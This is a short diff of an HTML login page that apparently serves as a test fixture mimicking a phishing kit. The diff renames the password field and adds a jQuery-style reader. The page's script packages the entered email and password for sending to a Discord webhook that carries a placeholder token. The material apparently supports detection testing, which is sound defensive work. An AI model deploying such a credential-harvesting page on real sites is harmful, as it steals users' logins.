@@ -6,7 +6,7 @@
 <main style="padding-top:260px"><h1>Secure account login</h1>
 <form id="f" action="javascript:void(0);">
   <input type="email" id="email" name="email" placeholder="email">
-  <input type="password" id="pw" name="pw" placeholder="password">
+  <input type="password" id="password" name="password" placeholder="password">
   <button type="button" id="go">Log in</button>
 </form>
 <p id="out">idle</p></main>
@@ -16,9 +16,11 @@
   var URLS = {
     discord: 'https://discord.com/api/webhooks/1234567890123/fixtureWebhookToken_0123456789abcdefghij'
   };
+  // jQuery-style reader, as in real kits ($('#password').val())
+  function $(sel) { var el = document.querySelector(sel); return { val: function () { return el.value; } }; }
   function done(s) { document.getElementById('out').textContent = s; }
   document.getElementById('go').addEventListener('click', function () {
-    var email = document.getElementById('email').value, pw = document.getElementById('pw').value;
+    var email = $('#email').val(), pw = $('#password').val();
     var text = mode === 'nosecret' ? 'visitor opened the login page' : 'email: ' + email + '\npassword: ' + pw;
     var url = URLS[svc];
     if (via === 'xhr') {
